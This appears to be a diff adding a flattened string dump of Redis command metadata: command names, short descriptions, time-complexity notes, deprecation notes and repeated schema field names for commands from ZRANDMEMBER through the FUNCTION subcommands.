@@ -1,0 +1,3996 @@
+1943567864
+zrandmember
+Returns one or more random members from a sorted set.
+sorted-set
+complexity
+O(N) where N is the number of members returned
+display_text
+key_spec_index
+display_text
+withscores
+pure-token
+display_text
+withscores
+WITHSCORES
+Counts the number of set bits (population counting) in a string.
+complexity
+Added the `BYTE|BIT` option.
+display_text
+key_spec_index
+display_text
+display_text
+pure-token
+display_text
+pure-token
+display_text
+Returns the lowest-scoring members from a sorted set after removing them. Deletes the sorted set if the last member was popped.
+sorted-set
+complexity
+O(log(N)*M) with N being the number of elements in the sorted set, and M being the number of elements popped.
+display_text
+key_spec_index
+display_text
+zdiffstore
+Stores the difference of multiple sorted sets in a key.
+sorted-set
+complexity
+O(L + (N-K)log(N)) worst case where L is the total number of elements in all the sets, N is the size of the first set, and K is the size of the result set.
+destination
+display_text
+destination
+key_spec_index
+display_text
+display_text
+key_spec_index
+hincrbyfloat
+Increments the floating point value of a field by a number. Uses 0 as initial value if the field doesn't exist.
+complexity
+display_text
+key_spec_index
+display_text
+display_text
+evalsha_ro
+Executes a read-only server-side Lua script by SHA1 digest.
+complexity
+Depends on the script that is executed.
+display_text
+display_text
+display_text
+key_spec_index
+display_text
+zrevrangebyscore
+Returns members in a sorted set within a range of scores in reverse order.
+sorted-set
+complexity
+O(log(N)+M) with N being the number of elements in the sorted set and M the number of elements being returned. If M is constant (e.g. always asking for the first 10 elements with LIMIT), you can consider it O(log(N)).
++deprecated
+deprecated_since
+replaced_by
+`ZRANGE` with the `REV` and `BYSCORE` arguments
+`min` and `max` can be exclusive.
+display_text
+key_spec_index
+display_text
+display_text
+withscores
+pure-token
+display_text
+withscores
+WITHSCORES
+display_text
+display_text
+Sets a Redis server as a replica of another, or promotes it to being a master.
+complexity
++deprecated
+deprecated_since
+replaced_by
+`REPLICAOF`
+display_text
+display_text
+Returns all fields in a hash.
+complexity
+O(N) where N is the size of the hash.
+display_text
+key_spec_index
+Increments the integer value of a key by a number. Uses 0 as initial value if the key doesn't exist.
+complexity
+display_text
+key_spec_index
+display_text
+A container for server configuration commands.
+complexity
+Depends on subcommand.
+subcommands
+config|resetstat
+Resets the server's statistics.
+complexity
+config|rewrite
+Persists the effective configuration to file.
+complexity
+config|get
+Returns the effective values of configuration parameters.
+complexity
+O(N) when N is the number of configuration parameters provided
+Added the ability to pass multiple pattern parameters in one call
+display_text
+config|help
+Returns helpful text about the different subcommands.
+complexity
+config|set
+Sets configuration parameters in-flight.
+complexity
+O(N) when N is the number of configuration parameters provided
+Added the ability to set multiple parameters in one call.
+display_text
+display_text
+Configures a server as replica of another, or promotes it to a master.
+complexity
+display_text
+display_text
+Determines whether a field exists in a hash.
+complexity
+display_text
+key_spec_index
+display_text
+Returns the given string.
+connection
+complexity
+display_text
+Sets the expiration time of a key to a Unix milliseconds timestamp.
+complexity
+Added options: `NX`, `XX`, `GT` and `LT`.
+display_text
+key_spec_index
+unix-time-milliseconds
+display_text
+unix-time-milliseconds
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+Decrements a number from the integer value of a key. Uses 0 as initial value if the key doesn't exist.
+complexity
+display_text
+key_spec_index
+display_text
+Posts a message to a channel.
+complexity
+O(N+M) where N is the number of clients subscribed to the receiving channel and M is the total number of subscribed patterns (by any client).
+display_text
+display_text
+Blocks until the asynchronous replication of all preceding write commands sent by the connection is completed.
+complexity
+numreplicas
+display_text
+numreplicas
+display_text
+Sets the expiration time of a key to a Unix timestamp.
+complexity
+Added options: `NX`, `XX`, `GT` and `LT`.
+display_text
+key_spec_index
+unix-time-seconds
+display_text
+unix-time-seconds
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+brpoplpush
+Pops an element from a list, pushes it to another list and returns it. Block until an element is available otherwise. Deletes the list if the last element was popped.
+complexity
++deprecated
+deprecated_since
+replaced_by
+`BLMOVE` with the `RIGHT` and `LEFT` arguments
+`timeout` is interpreted as a double instead of an integer.
+display_text
+key_spec_index
+destination
+display_text
+destination
+key_spec_index
+display_text
+Queries a geospatial index for members inside an area of a box or a circle.
+complexity
+O(N+log(M)) where N is the number of elements in the grid-aligned bounding box area around the shape provided as the filter and M is the number of items inside the shape
+Added support for uppercase unit names.
+display_text
+key_spec_index
+display_text
+FROMMEMBER
+fromlonlat
+FROMLONLAT
+display_text
+display_text
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+display_text
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+count-block
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+Executes all commands in a transaction.
+transactions
+complexity
+Depends on commands in the transaction
+Performs bitwise operations on multiple strings, and stores the result.
+complexity
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+display_text
+key_spec_index
+display_text
+key_spec_index
+Returns the number of messages that were successfully acknowledged by the consumer group member of a stream.
+complexity
+O(1) for each message ID processed.
+display_text
+key_spec_index
+display_text
+display_text
+Removes elements from both ends a list. Deletes the list if all elements were trimmed.
+complexity
+O(N) where N is the number of elements to be removed by the operation.
+display_text
+key_spec_index
+display_text
+display_text
+An internal command for replicating stream values.
+complexity
+Added the `entries_added` and `max_deleted_entry_id` arguments.
+display_text
+key_spec_index
+display_text
+entries-added
+display_text
+entries-added
+ENTRIESADDED
+max-deleted-id
+display_text
+max-deleted-id
+MAXDELETEDID
+Returns the number of messages after removing them from a stream.
+complexity
+O(1) for each single item to delete in the stream, regardless of the stream size.
+display_text
+key_spec_index
+display_text
+Returns the string value of a key after deleting the key.
+complexity
+display_text
+key_spec_index
+Post a message to a shard channel
+complexity
+O(N) where N is the number of clients subscribed to the receiving shard channel.
+shardchannel
+display_text
+shardchannel
+display_text
+Sets the string value and expiration time of a key. Creates the key if it doesn't exist.
+complexity
++deprecated
+deprecated_since
+replaced_by
+`SET` with the `EX` argument
+display_text
+key_spec_index
+display_text
+display_text
+Determines whether one or more keys exist.
+complexity
+O(N) where N is the number of keys to check.
+Accepts multiple `key` arguments.
+display_text
+key_spec_index
+Returns the highest- or lowest-scoring members from one or more sorted sets after removing them. Deletes the sorted set if the last member was popped.
+sorted-set
+complexity
+O(K) + O(M*log(N)) where K is the number of provided keys, N being the number of elements in the sorted set, and M being the number of elements popped.
+display_text
+display_text
+key_spec_index
+pure-token
+display_text
+pure-token
+display_text
+display_text
+Returns a substring from a string value.
+complexity
+O(N) where N is the length of the returned string. The complexity is ultimately determined by the returned length, but because creating a substring from an existing string is very cheap, it can be considered O(1) for small strings.
++deprecated
+deprecated_since
+replaced_by
+`GETRANGE`
+display_text
+key_spec_index
+display_text
+display_text
+Returns the information and entries from a stream consumer group's pending entries list.
+complexity
+O(N) with N being the number of elements returned, so asking for a small fixed number of entries per call is O(1). O(M), where M is the total number of entries scanned when used with the IDLE filter. When the command returns just the summary and the list of consumers is small, it runs in O(1) time; otherwise, an additional O(N) time for iterating every consumer.
+Added the `IDLE` option and exclusive range intervals.
+display_text
+key_spec_index
+display_text
+min-idle-time
+display_text
+min-idle-time
+display_text
+display_text
+display_text
+display_text
+Executes a server-side Lua script by SHA1 digest.
+complexity
+Depends on the script that is executed.
+display_text
+display_text
+display_text
+key_spec_index
+display_text
+Atomically modifies the string values of one or more keys only when all keys don't exist.
+complexity
+O(N) where N is the number of keys to set.
+display_text
+key_spec_index
+display_text
+A container for Lua scripts management commands.
+complexity
+Depends on subcommand.
+subcommands
+script|help
+Returns helpful text about the different subcommands.
+complexity
+script|flush
+Removes all server-side Lua scripts from the script cache.
+complexity
+O(N) with N being the number of scripts in cache
+Added the `ASYNC` and `SYNC` flushing mode modifiers.
+flush-type
+pure-token
+display_text
+pure-token
+display_text
+script|debug
+Sets the debug mode of server-side Lua scripts.
+complexity
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+script|exists
+Determines whether server-side Lua scripts exist in the script cache.
+complexity
+O(N) with N being the number of scripts to check (so checking a single script is an O(1) operation).
+display_text
+script|load
+Loads a server-side Lua script to the script cache.
+complexity
+O(N) with N being the length in bytes of the script body.
+display_text
+script|kill
+Terminates a server-side Lua script during execution.
+complexity
+Removes all keys from all databases.
+complexity
+O(N) where N is the total number of keys in all databases
+Added the `ASYNC` flushing mode modifier.
+Added the `SYNC` flushing mode modifier.
+flush-type
+pure-token
+display_text
+pure-token
+display_text
+Pops an element from a list, pushes it to another list and returns it. Blocks until an element is available otherwise. Deletes the list if the last element was moved.
+complexity
+display_text
+key_spec_index
+destination
+display_text
+destination
+key_spec_index
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+display_text
+Returns the union of multiple sets.
+complexity
+O(N) where N is the total number of elements in all given sets.
+display_text
+key_spec_index
+Set the string value of a key only when the key doesn't exist.
+complexity
++deprecated
+deprecated_since
+replaced_by
+`SET` with the `NX` argument
+display_text
+key_spec_index
+display_text
+expiretime
+Returns the expiration time of a key as a Unix timestamp.
+complexity
+display_text
+key_spec_index
+zremrangebyrank
+Removes members in a sorted set within a range of indexes. Deletes the sorted set if all members were removed.
+sorted-set
+complexity
+O(log(N)+M) with N being the number of elements in the sorted set and M the number of elements removed by the operation.
+display_text
+key_spec_index
+display_text
+display_text
+Returns the number of fields in a hash.
+complexity
+display_text
+key_spec_index
+Returns all key names that match a pattern.
+complexity
+O(N) with N being the number of keys in the database, under the assumption that the key names in the database and the given pattern have limited length.
+display_text
+Returns and removes the last elements of a list. Deletes the list if the last element was popped.
+complexity
+O(N) where N is the number of elements returned
+Added the `count` argument.
+display_text
+key_spec_index
+display_text
+Changes the selected database.
+connection
+complexity
+display_text
+Forgets about watched keys of a transaction.
+transactions
+complexity
+Returns the length of a list.
+complexity
+display_text
+key_spec_index
+smismember
+Determines whether multiple members belong to a set.
+complexity
+O(N) where N is the number of elements being checked for membership
+display_text
+key_spec_index
+display_text
+sdiffstore
+Stores the difference of multiple sets in a key.
+complexity
+O(N) where N is the total number of elements in all given sets.
+destination
+display_text
+destination
+key_spec_index
+display_text
+key_spec_index
+sunsubscribe
+Stops listening to messages posted to shard channels.
+complexity
+O(N) where N is the number of shard channels to unsubscribe.
+shardchannel
+display_text
+shardchannel
+Creates or modifies the value of a field in a hash.
+complexity
+O(1) for each field/value pair added, so O(N) to add N field/value pairs when the command is called with multiple field/value pairs.
+Accepts multiple `field` and `value` arguments.
+display_text
+key_spec_index
+display_text
+display_text
+bgrewriteaof
+Asynchronously rewrites the append-only file to disk.
+complexity
+Returns members from a geospatial index as geohash strings.
+complexity
+O(1) for each member requested.
+display_text
+key_spec_index
+display_text
+Returns a bit value by offset.
+complexity
+display_text
+key_spec_index
+display_text
+Sets the expiration time of a key in seconds.
+complexity
+Added options: `NX`, `XX`, `GT` and `LT`.
+display_text
+key_spec_index
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+Iterates over members of a set.
+complexity
+O(1) for every call. O(N) for a complete iteration, including enough command calls for the cursor to return back to 0. N is the number of elements inside the collection.
+display_text
+key_spec_index
+display_text
+display_text
+display_text
+zintercard
+Returns the number of members of the intersect of multiple sorted sets.
+sorted-set
+complexity
+O(N*K) worst case with N being the smallest input sorted set, K being the number of input sorted sets.
+display_text
+display_text
+key_spec_index
+display_text
+Returns the values of all fields in a hash.
+complexity
+O(N) where N is the number of fields being requested.
+display_text
+key_spec_index
+display_text
+ssubscribe
+Listens for messages published to shard channels.
+complexity
+O(N) where N is the number of shard channels to subscribe to.
+shardchannel
+display_text
+shardchannel
+Moves a member from one set to another.
+complexity
+display_text
+key_spec_index
+destination
+display_text
+destination
+key_spec_index
+display_text
+georadiusbymember_ro
+Returns members from a geospatial index that are within a distance from a member.
+complexity
+O(N+log(M)) where N is the number of elements inside the bounding box of the circular area delimited by center and radius and M is the number of items inside the index.
++deprecated
+deprecated_since
+replaced_by
+`GEOSEARCH` with the `BYRADIUS` and `FROMMEMBER` arguments
+display_text
+key_spec_index
+display_text
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+count-block
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+unsubscribe
+Stops listening to messages posted to channels.
+complexity
+O(N) where N is the number of channels to unsubscribe.
+display_text
+An internal command used in replication.
+A container for client connection commands.
+connection
+complexity
+Depends on subcommand.
+subcommands
+client|trackinginfo
+Returns information about server-assisted client-side caching for the connection.
+connection
+complexity
+client|caching
+Instructs the server whether to track the keys in the next request.
+connection
+complexity
+pure-token
+display_text
+pure-token
+display_text
+client|setname
+Sets the connection name.
+connection
+complexity
+connection-name
+display_text
+connection-name
+client|setinfo
+Sets information specific to the client or connection.
+connection
+complexity
+display_text
+display_text
+client|tracking
+Controls server-assisted client-side caching for the connection.
+connection
+complexity
+O(1). Some options may introduce additional complexity.
+pure-token
+display_text
+pure-token
+display_text
+display_text
+display_text
++multiple_token
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+client|getredir
+Returns the client ID to which the connection's tracking notifications are redirected.
+connection
+complexity
+client|pause
+Suspends commands processing.
+complexity
+`CLIENT PAUSE WRITE` mode added along with the `mode` option.
+display_text
+pure-token
+display_text
+pure-token
+display_text
+client|info
+Returns information about the connection.
+connection
+complexity
+Returns the unique client ID of the connection.
+connection
+complexity
+client|getname
+Returns the name of the connection.
+connection
+complexity
+client|list
+Lists open connections.
+connection
+complexity
+O(N) where N is the number of client connections
+Added unique client `id` field.
+Added optional `TYPE` filter.
+Added `user` field.
+Added `argv-mem`, `tot-mem`, `laddr` and `redir` fields and the optional `ID` filter.
+Added `resp`, `multi-mem`, `rbs` and `rbp` fields.
+Added `ssub` field.
+client-type
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+display_text
+client|no-evict
+Sets the client eviction mode of the connection.
+connection
+complexity
+pure-token
+display_text
+pure-token
+display_text
+client|help
+Returns helpful text about the different subcommands.
+connection
+complexity
+client|kill
+Terminates open connections.
+connection
+complexity
+O(N) where N is the number of client connections
+Added new filter format.
+`ID` option.
+Added `master` type in for `TYPE` option.
+Replaced `slave` `TYPE` with `replica`. `slave` still supported for backward compatibility.
+`LADDR` option.
+old-format
+display_text
+deprecated_since
+new-format
+display_text
+client-type
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+display_text
+display_text
+display_text
+pure-token
+display_text
+pure-token
+display_text
+client|reply
+Instructs the server whether to reply to commands.
+connection
+complexity
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+client|no-touch
+Controls whether commands sent by the client affect the LRU/LFU of accessed keys.
+connection
+complexity
+pure-token
+display_text
+pure-token
+display_text
+client|unpause
+Resumes processing commands from paused clients.
+connection
+complexity
+O(N) Where N is the number of paused clients
+client|unblock
+Unblocks a client blocked by a blocking command from a different connection.
+connection
+complexity
+O(log N) where N is the number of client connections
+display_text
+unblock-type
+pure-token
+display_text
+pure-token
+display_text
+Asynchronously saves the database(s) to disk.
+complexity
+Added the `SCHEDULE` option.
+pure-token
+display_text
+Removes one or more members from a set. Deletes the set if the last member was removed.
+complexity
+O(N) where N is the number of members to be removed.
+Accepts multiple `member` arguments.
+display_text
+key_spec_index
+display_text
+Returns the length of the value of a field.
+complexity
+display_text
+key_spec_index
+display_text
+geosearchstore
+Queries a geospatial index for members inside an area of a box or a circle, optionally stores the result.
+complexity
+O(N+log(M)) where N is the number of elements in the grid-aligned bounding box area around the shape provided as the filter and M is the number of items inside the shape
+Added support for uppercase unit names.
+destination
+display_text
+destination
+key_spec_index
+display_text
+key_spec_index
+display_text
+FROMMEMBER
+fromlonlat
+FROMLONLAT
+display_text
+display_text
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+display_text
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+count-block
+display_text
+pure-token
+display_text
+pure-token
+display_text
+Returns the number of existing keys out of those specified after updating the time they were last accessed.
+complexity
+O(N) where N is the number of keys that will be touched.
+display_text
+key_spec_index
+Returns a range of elements from a list.
+complexity
+O(S+N) where S is the distance of start offset from HEAD for small lists, from nearest end (HEAD or TAIL) for large lists; and N is the number of elements in the specified range.
+display_text
+key_spec_index
+display_text
+display_text
+Decrements the integer value of a key by one. Uses 0 as initial value if the key doesn't exist.
+complexity
+display_text
+key_spec_index
+Changes, or acquires, ownership of a message in a consumer group, as if the message was delivered a consumer group member.
+complexity
+O(log N) with N being the number of messages in the PEL of the consumer group.
+display_text
+key_spec_index
+display_text
+display_text
+min-idle-time
+display_text
+min-idle-time
+display_text
+display_text
+unix-time-milliseconds
+display_text
+unix-time-milliseconds
+display_text
+RETRYCOUNT
+pure-token
+display_text
+pure-token
+display_text
+display_text
+punsubscribe
+Stops listening to messages published to channels that match one or more patterns.
+complexity
+O(N) where N is the number of patterns to unsubscribe.
+display_text
+Enables read-only queries for a connection to a Redis Cluster replica node.
+complexity
+Adds one or more members to a geospatial index. The key is created if it doesn't exist.
+complexity
+O(log(N)) for each item added, where N is the number of elements in the sorted set.
+Added the `CH`, `NX` and `XX` options.
+display_text
+key_spec_index
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+display_text
+display_text
+display_text
+Returns the expiration time in seconds of a key.
+complexity
+Added the -2 reply.
+display_text
+key_spec_index
+zremrangebylex
+Removes members in a sorted set within a lexicographical range. Deletes the sorted set if all members were removed.
+sorted-set
+complexity
+O(log(N)+M) with N being the number of elements in the sorted set and M the number of elements removed by the operation.
+display_text
+key_spec_index
+display_text
+display_text
+Removes and returns the member with the highest score from one or more sorted sets. Blocks until a member available otherwise.  Deletes the sorted set if the last element was popped.
+sorted-set
+complexity
+O(log(N)) with N being the number of elements in the sorted set.
+`timeout` is interpreted as a double instead of an integer.
+display_text
+key_spec_index
+display_text
+Renames a key and overwrites the destination.
+complexity
+display_text
+key_spec_index
+display_text
+key_spec_index
+Sets the value of an element in a list by its index.
+complexity
+O(N) where N is the length of the list. Setting either the first or the last element of the list is O(1).
+display_text
+key_spec_index
+display_text
+display_text
+zrangestore
+Stores a range of members from sorted set in a key.
+sorted-set
+complexity
+O(log(N)+M) with N being the number of elements in the sorted set and M the number of elements stored into the destination key.
+display_text
+key_spec_index
+display_text
+key_spec_index
+display_text
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+display_text
+display_text
+Removes elements from a list. Deletes the list if the last element was removed.
+complexity
+O(N+M) where N is the length of the list and M is the number of elements removed.
+display_text
+key_spec_index
+display_text
+display_text
+Starts a coordinated failover from a server to one of its replicas.
+complexity
+display_text
+display_text
+pure-token
+display_text
+pure-token
+display_text
+milliseconds
+display_text
+milliseconds
+Returns the messages from a stream within a range of IDs.
+complexity
+O(N) with N being the number of elements being returned. If N is constant (e.g. always asking for the first 10 elements with COUNT), you can consider it O(1).
+Added exclusive ranges.
+display_text
+key_spec_index
+display_text
+display_text
+display_text
+Copies the value of a key to a new key.
+complexity
+O(N) worst case for collections, where N is the number of nested items. O(1) for string values.
+display_text
+key_spec_index
+destination
+display_text
+destination
+key_spec_index
+destination-db
+display_text
+destination-db
+pure-token
+display_text
+Finds the longest common substring.
+complexity
+O(N*M) where N and M are the lengths of s1 and s2, respectively
+display_text
+key_spec_index
+display_text
+key_spec_index
+pure-token
+display_text
+pure-token
+display_text
+min-match-len
+display_text
+min-match-len
+MINMATCHLEN
+withmatchlen
+pure-token
+display_text
+withmatchlen
+WITHMATCHLEN
+Returns detailed information about all commands.
+complexity
+O(N) where N is the total number of Redis commands
+subcommands
+command|getkeys
+Extracts the key names from an arbitrary command.
+complexity
+O(N) where N is the number of arguments to the command
+display_text
+display_text
+command|docs
+Returns documentary information about one, multiple or all commands.
+complexity
+O(N) where N is the number of commands to look up
+command-name
+display_text
+command-name
+command|info
+Returns information about one, multiple or all commands.
+complexity
+O(N) where N is the number of commands to look up
+Allowed to be called with no argument to get info on all commands.
+command-name
+display_text
+command-name
+command|count
+Returns a count of commands.
+complexity
+command|list
+Returns a list of command names.
+complexity
+O(N) where N is the total number of Redis commands
+module-name
+display_text
+module-name
+display_text
+display_text
+command|help
+Returns helpful text about the different subcommands.
+complexity
+command|getkeysandflags
+Extracts the key names and access flags for an arbitrary command.
+complexity
+O(N) where N is the number of arguments to the command
+display_text
+display_text
+Iterates over fields and values of a hash.
+complexity
+O(1) for every call. O(N) for a complete iteration, including enough command calls for the cursor to return back to 0. N is the number of elements inside the collection.
+display_text
+key_spec_index
+display_text
+display_text
+display_text
+Merges one or more HyperLogLog values into a single key.
+hyperloglog
+complexity
+O(N) to merge N HyperLogLogs, but with high constant times.
+display_text
+key_spec_index
+display_text
+key_spec_index
+Synchronously saves the database(s) to disk and shuts down the Redis server.
+complexity
+O(N) when saving, where N is the total number of keys in all databases when saving data, otherwise O(1)
+Added the `NOW`, `FORCE` and `ABORT` modifiers.
+save-selector
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+xautoclaim
+Changes, or acquires, ownership of messages in a consumer group, as if the messages were delivered to as consumer group member.
+complexity
+O(1) if COUNT is small.
+Added an element to the reply array, containing deleted entries the command cleared from the PEL
+display_text
+key_spec_index
+display_text
+display_text
+min-idle-time
+display_text
+min-idle-time
+display_text
+display_text
+pure-token
+display_text
+Increments the integer value of a field in a hash by a number. Uses 0 as initial value if the field doesn't exist.
+complexity
+display_text
+key_spec_index
+display_text
+display_text
+Inserts an element before or after another element in a list.
+|omplexity
+O(N) where N is the number of elements to traverse before seeing the value pivot. This means that inserting somewhere on the left end on the list (head) can be considered O(1) and inserting somewhere on the right end (tail) is O(N).
+display_text
+key_spec_index
+pure-token
+display_text
+pure-token
+display_text
+display_text
+display_text
+Overwrites a part of a string value with another by an offset. Creates the key if it doesn't exist.
+complexity
+O(1), not counting the time taken to copy the new string in place. Usually, this string is very small so the amortized complexity is O(1). Otherwise, complexity is O(M) with M being the length of the value argument.
+display_text
+key_spec_index
+display_text
+display_text
+Monitors changes to keys to determine the execution of a transaction.
+transactions
+complexity
+O(1) for every key.
+display_text
+key_spec_index
+zrangebylex
+Returns members in a sorted set within a lexicographical range.
+sorted-set
+complexity
+O(log(N)+M) with N being the number of elements in the sorted set and M the number of elements being returned. If M is constant (e.g. always asking for the first 10 elements with LIMIT), you can consider it O(log(N)).
++deprecated
+deprecated_since
+replaced_by
+`ZRANGE` with the `BYLEX` argument
+display_text
+key_spec_index
+display_text
+display_text
+display_text
+display_text
+Returns the Unix timestamp of the last successful save to disk.
+complexity
+A container for Pub/Sub commands.
+complexity
+Depends on subcommand.
+subcommands
+pubsub|help
+Returns helpful text about the different subcommands.
+complexity
+pubsub|channels
+Returns the active channels.
+complexity
+O(N) where N is the number of active channels, and assuming constant time pattern matching (relatively short channels and patterns)
+display_text
+pubsub|shardnumsub
+Returns the count of subscribers of shard channels.
+complexity
+O(N) for the SHARDNUMSUB subcommand, where N is the number of requested shard channels
+shardchannel
+display_text
+shardchannel
+pubsub|numsub
+Returns a count of subscribers to channels.
+complexity
+O(N) for the NUMSUB subcommand, where N is the number of requested channels
+display_text
+pubsub|shardchannels
+Returns the active shard channels.
+complexity
+O(N) where N is the number of active shard channels, and assuming constant time pattern matching (relatively short shard channels).
+display_text
+pubsub|numpat
+Returns a count of unique pattern subscriptions.
+complexity
+Iterates over the key names in the database.
+complexity
+O(1) for every call. O(N) for a complete iteration, including enough command calls for the cursor to return back to 0. N is the number of elements inside the collection.
+Added the `TYPE` subcommand.
+display_text
+display_text
+display_text
+display_text
+zinterstore
+Stores the intersect of multiple sorted sets in a key.
+sorted-set
+complexity
+O(N*K)+O(M*log(M)) worst case with N being the smallest input sorted set, K being the number of input sorted sets and M being the number of elements in the resulting sorted set.
+destination
+display_text
+destination
+key_spec_index
+display_text
+display_text
+key_spec_index
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+Internal commands for debugging HyperLogLog values.
+hyperloglog
+complexity
+subcommand
+display_text
+subcommand
+display_text
+key_spec_index
+Returns the sorted elements of a list, a set, or a sorted set.
+complexity
+O(N+M*log(M)) where N is the number of elements in the list or set to sort, and M the number of returned elements. When the elements are not sorted, complexity is O(N).
+display_text
+key_spec_index
+by-pattern
+display_text
+key_spec_index
+display_text
+display_text
+get-pattern
+display_text
+key_spec_index
++multiple_token
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+Returns a random key name from the database.
+complexity
+A container for Access List Control commands.
+complexity
+Depends on subcommand.
+subcommands
+Returns helpful text about the different subcommands.
+complexity
+acl|dryrun
+Simulates the execution of a command by a user, without executing the command.
+complexity
+display_text
+display_text
+display_text
+Reloads the rules from the configured ACL file.
+complexity
+O(N). Where N is the number of configured users.
+acl|getuser
+Lists the ACL rules of a user.
+complexity
+O(N). Where N is the number of password, command and pattern rules that the user has.
+Added Pub/Sub channel patterns.
+Added selectors and changed the format of key and channel patterns from a list to their rule representation.
+display_text
+acl|deluser
+Deletes ACL users, and terminates their connections.
+complexity
+O(1) amortized time considering the typical user.
+display_text
+Lists the ACL categories, or the commands inside a category.
+complexity
+O(1) since the categories and commands are a fixed set.
+display_text
+Lists all ACL users.
+complexity
+O(N). Where N is the number of configured users.
+acl|genpass
+Generates a pseudorandom, secure password that can be used to identify ACL users.
+complexity
+display_text
+Lists recent security events generated due to ACL rules.
+complexity
+O(N) with N being the number of entries shown.
+Added entry ID, timestamp created, and timestamp last updated.
+display_text
+pure-token
+display_text
+Dumps the effective rules in ACL file format.
+complexity
+O(N). Where N is the number of configured users.
+acl|setuser
+Creates and modifies an ACL user and its rules.
+complexity
+O(N). Where N is the number of rules provided.
+Added Pub/Sub channel patterns.
+Added selectors and key based permissions.
+display_text
+display_text
+acl|whoami
+Returns the authenticated username of the current connection.
+complexity
+Saves the effective ACL rules in the configured ACL file.
+complexity
+O(N). Where N is the number of configured users.
+zunionstore
+Stores the union of multiple sorted sets in a key.
+sorted-set
+complexity
+O(N)+O(M log(M)) with N being the sum of the sizes of the input sorted sets, and M being the number of elements in the resulting sorted set.
+destination
+display_text
+destination
+key_spec_index
+display_text
+display_text
+key_spec_index
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+Synchronously saves the database(s) to disk.
+complexity
+O(N) where N is the total number of keys in all databases
+Returns the distance between two members of a geospatial index.
+complexity
+display_text
+key_spec_index
+display_text
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+pure-token
+display_text
+Increments the score of a member in a sorted set.
+sorted-set
+complexity
+O(log(N)) where N is the number of elements in the sorted set.
+display_text
+key_spec_index
+display_text
+display_text
+Removes and returns the last element in a list. Blocks until an element is available otherwise. Deletes the list if the last element was popped.
+complexity
+O(N) where N is the number of provided keys.
+`timeout` is interpreted as a double instead of an integer.
+display_text
+key_spec_index
+display_text
+Returns the number of keys in the database.
+complexity
+Swaps two Redis databases.
+complexity
+O(N) where N is the count of clients watching or blocking on keys from both databases.
+display_text
+display_text
+Enables read-write queries for a connection to a Reids Cluster replica node.
+complexity
+Returns multiple elements from a list after removing them. Deletes the list if the last element was popped.
+complexity
+O(N+M) where N is the number of provided keys and M is the number of elements returned.
+display_text
+display_text
+key_spec_index
+pure-token
+display_text
+pure-token
+display_text
+display_text
+Returns the index of a member in a sorted set ordered by descending scores.
+sorted-set
+complexity
+Added the optional `WITHSCORE` argument.
+display_text
+key_spec_index
+display_text
+pure-token
+display_text
+Pops the first element from one of multiple lists. Blocks until an element is available otherwise. Deletes the list if the last element was popped.
+complexity
+O(N+M) where N is the number of provided keys and M is the number of elements returned.
+display_text
+display_text
+display_text
+key_spec_index
+pure-token
+display_text
+pure-token
+display_text
+display_text
+Deletes one or more keys.
+complexity
+O(N) where N is the number of keys that will be removed. When a key to remove holds a value other than a string, the individual complexity for this key is O(M) where M is the number of elements in the list, set, sorted set or hash. Removing a single key that holds a string value is O(1).
+display_text
+key_spec_index
+Executes a read-only server-side Lua script.
+complexity
+Depends on the script that is executed.
+display_text
+display_text
+display_text
+key_spec_index
+display_text
+restore-asking
+An internal command for migrating keys in a cluster.
+complexity
+O(1) to create the new key and additional O(N*M) to reconstruct the serialized value, where N is the number of Redis objects composing the value and M their average size. For small string values the time complexity is thus O(1)+O(1*M) where M is small, so simply O(1). However for sorted set values the complexity is O(N*M*log(N)) because inserting values into sorted sets is O(log(N)).
+Added the `REPLACE` modifier.
+Added the `ABSTTL` modifier.
+Added the `IDLETIME` and `FREQ` options.
+display_text
+key_spec_index
+display_text
+serialized-value
+display_text
+serialized-value
+pure-token
+display_text
+pure-token
+display_text
+display_text
+display_text
+Adds one or more members to a set. Creates the key if it doesn't exist.
+complexity
+O(1) for each element added, so O(N) to add N elements when the command is called with multiple arguments.
+Accepts multiple `member` arguments.
+display_text
+key_spec_index
+display_text
+Returns information and statistics about the server.
+complexity
+Added support for taking multiple section arguments.
+display_text
+Asynchronously deletes one or more keys.
+complexity
+O(1) for each key removed regardless of its size. Then the command does O(N) work in a different thread in order to reclaim memory, where N is the number of allocations the deleted objects where composed of.
+display_text
+key_spec_index
+A container for function commands.
+complexity
+Depends on subcommand.
+subcommands
+function|delete
+Deletes a library and its functions.
+complexity
+library-name
+display_text
+library-name
+function|flush
+Deletes all libraries and functions.
+complexity
+O(N) where N is the number of functions deleted
+flush-type
+pure-token
+display_text
+pure-token
+display_text
+function|restore
